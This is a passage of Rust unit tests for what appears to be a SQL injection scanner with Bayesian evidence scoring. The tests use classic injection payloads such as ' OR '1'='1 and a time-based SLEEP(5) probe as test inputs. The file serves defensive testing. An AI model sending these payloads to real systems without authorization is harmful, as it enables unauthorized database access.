            parameter_source: ParameterSource::UrlQueryString,
            endpoint_type: EndpointType::RestApi,
            detected_tech: vec!["Laravel".to_string()],
            framework: Some("Laravel".to_string()),
            server: None,
            other_parameters: vec![],
            is_json_api: false,
            is_graphql: false,
            form_fields: vec![],
            content_type: None,
        };
        let payloads =
            scanner.get_framework_specific_payloads(&laravel_context, &InjectionContext::String);
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("migrations")));

        // Test GraphQL
        let graphql_context = ScanContext {
            parameter_source: ParameterSource::GraphQL,
            endpoint_type: EndpointType::GraphQlApi,
            detected_tech: vec![],
            framework: None,
            server: None,
            other_parameters: vec![],
            is_json_api: false,
            is_graphql: true,
            form_fields: vec![],
            content_type: None,
        };
        let payloads =
            scanner.get_framework_specific_payloads(&graphql_context, &InjectionContext::String);
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("__typename")));
    }

    #[test]
    fn test_extract_param_value() {
        let client = Arc::new(HttpClient::new(10, 3).unwrap());
        let scanner = EnhancedSqliScanner::new(client);

        // Test basic extraction
        let value = scanner.extract_param_value("http://example.com?id=123", "id");
        assert_eq!(value, Some("123".to_string()));

        // Test URL-encoded value
        let value = scanner.extract_param_value("http://example.com?name=hello%20world", "name");
        assert_eq!(value, Some("hello world".to_string()));

        // Test missing parameter
        let value = scanner.extract_param_value("http://example.com?foo=bar", "baz");
        assert_eq!(value, None);

        // Test multiple parameters
        let value = scanner.extract_param_value("http://example.com?a=1&b=2&c=3", "b");
        assert_eq!(value, Some("2".to_string()));

        // Test no query string
        let value = scanner.extract_param_value("http://example.com/path", "id");
        assert_eq!(value, None);
    }

    #[test]
    fn test_analyze_response_for_evidence() {
        let client = Arc::new(HttpClient::new(10, 3).unwrap());
        let scanner = EnhancedSqliScanner::new(client);

        let baseline = HttpResponse {
            status_code: 200,
            body: "Normal response body".to_string(),
            headers: HashMap::new(),
            duration_ms: 100,
        };

        // Test SQL error detection
        let error_response = HttpResponse {
            status_code: 500,
            body: "MySQL syntax error: You have an error in your SQL syntax".to_string(),
            headers: HashMap::new(),
            duration_ms: 100,
        };
        let evidence = scanner.analyze_response_for_evidence(
            &error_response,
            &baseline,
            "' OR '1'='1",
            &EvidenceType::ErrorMessage,
        );
        assert!(matches!(evidence.evidence_type, EvidenceType::ErrorMessage));
        assert!(evidence.likelihood_ratio > 10.0); // Strong evidence

        // Test status code change (500)
        let server_error = HttpResponse {
            status_code: 500,
            body: "Internal Server Error".to_string(),
            headers: HashMap::new(),
            duration_ms: 100,
        };
        let evidence = scanner.analyze_response_for_evidence(
            &server_error,
            &baseline,
            "test",
            &EvidenceType::StatusCodeChange,
        );
        assert!(matches!(
            evidence.evidence_type,
            EvidenceType::StatusCodeChange
        ));
        assert!(evidence.likelihood_ratio > 3.0);

        // Test timing anomaly
        let slow_response = HttpResponse {
            status_code: 200,
            body: "Normal response".to_string(),
            headers: HashMap::new(),
            duration_ms: 5200, // 5+ seconds delay
        };
        let evidence = scanner.analyze_response_for_evidence(
            &slow_response,
            &baseline,
            "' AND SLEEP(5)--",
            &EvidenceType::TimingAnomaly,
        );
        assert!(matches!(
            evidence.evidence_type,
            EvidenceType::TimingAnomaly
        ));
        assert!(evidence.likelihood_ratio > 8.0); // Strong evidence for time-based

        // Test no change (weak negative evidence)
        let normal_response = HttpResponse {
            status_code: 200,
            body: "Normal response".to_string(),
            headers: HashMap::new(),
            duration_ms: 105,
        };
        let evidence = scanner.analyze_response_for_evidence(
            &normal_response,
            &baseline,
            "test",
            &EvidenceType::BehaviorChange,
        );
        assert!(evidence.likelihood_ratio < 1.0); // Weak negative evidence
    }

    #[test]
    fn test_hypothesis_engine_integration() {
        // Test that we can create and use the hypothesis engine
        let mut engine = HypothesisEngine::new();

        let hints = ResponseHints {
            has_sql_keywords: true,
            has_error_messages: false,
            has_stack_trace: false,
            has_path_disclosure: false,
            reflects_input: true,
            timing_ms: 100,
            status_code: Some(200),
            content_type: Some("text/html".to_string()),
            body_length: 1000,
            error_patterns: vec![],
        };

        // Generate hypotheses for a parameter that looks SQL-related
        let hypotheses = engine.generate_hypotheses("id", "123", "http://example.com/api", &hints);

        // Should have at least SQLi hypothesis
        assert!(!hypotheses.is_empty());
        let sqli_hyp = hypotheses
            .iter()
            .find(|h| matches!(h.hypothesis_type, HypothesisType::SqlInjection { .. }));
        assert!(sqli_hyp.is_some());

        // SQLi prior should be boosted for "id" parameter
        let sqli = sqli_hyp.unwrap();
        assert!(sqli.prior_probability > 0.2); // Should have context boost

        // Test evidence update
        let evidence = Evidence::new(
            EvidenceType::ErrorMessage,
            "SQL syntax error detected".to_string(),
            10.0,
        );
        engine.update_with_evidence(&sqli.id, evidence);

        // Probability should have increased
        let updated = engine.get_hypothesis(&sqli.id).unwrap();
        assert!(updated.posterior_probability > sqli.prior_probability);
    }

    #[test]
    fn test_create_vulnerability_from_hypothesis() {
        let client = Arc::new(HttpClient::new(10, 3).unwrap());
        let scanner = EnhancedSqliScanner::new(client);

        // Create a hypothesis with evidence
        let hypothesis = Hypothesis {
            id: "test_hyp_1".to_string(),
            hypothesis_type: HypothesisType::SqlInjection { db_type: None },
            target: "http://example.com/api?id=1".to_string(),
            prior_probability: 0.4,
            posterior_probability: 0.95,
            evidence: vec![
                Evidence::new(
                    EvidenceType::ErrorMessage,
                    "MySQL syntax error".to_string(),
                    12.0,
                )
                .with_payload("' OR '1'='1"),
                Evidence::new(EvidenceType::StatusCodeChange, "500 error".to_string(), 5.0),
            ],
            suggested_tests: vec![],
            status: HypothesisStatus::Confirmed,
            parent_hypothesis: None,
            child_hypotheses: vec![],
        };

        let baseline = HttpResponse {
            status_code: 200,
            body: "Normal response".to_string(),
            headers: HashMap::new(),
            duration_ms: 100,
        };

        let vuln = scanner.create_vulnerability_from_hypothesis(
            "http://example.com/api?id=1",
            "id",
            &hypothesis,
            &baseline,
        );

        assert_eq!(vuln.vuln_type, "Bayesian-Confirmed SQL Injection");
        assert!(matches!(vuln.severity, Severity::Critical));
        assert!(matches!(vuln.confidence, Confidence::High)); // 0.95 > 0.95 threshold
        assert_eq!(vuln.parameter, Some("id".to_string()));
        assert!(vuln.description.contains("95.0%"));
        assert!(vuln.evidence.unwrap().contains("Evidence collected"));
    }
}
